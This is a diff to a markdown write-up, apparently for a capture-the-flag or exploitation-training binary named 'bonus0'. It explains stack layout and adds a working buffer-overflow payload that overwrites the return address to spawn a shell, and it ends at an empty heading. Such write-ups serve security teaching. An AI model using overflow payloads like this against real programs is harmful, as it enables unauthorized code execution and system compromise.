@@ -124,3 +124,13 @@ buffer  |      buffer[64]      |
 ```
 If writes starting at buffer + 22 continue past the end of the buffer, they move toward higher addresses in memory. 
 The first control data they would encounter is the saved EBP, and immediately after that comes the saved return address.
+
+## payload for test 
+```bash
+(python -c "print 'A'*4095 + '\n' + 'B'*9 + '\x4a\xf9\xff\xbf' + 'C'*50" ; cat ) | ./bonus0
+```     
+
+after it the program will run the system("/bin/sh") and we can get the shell.
+
+what you should do after it :
+
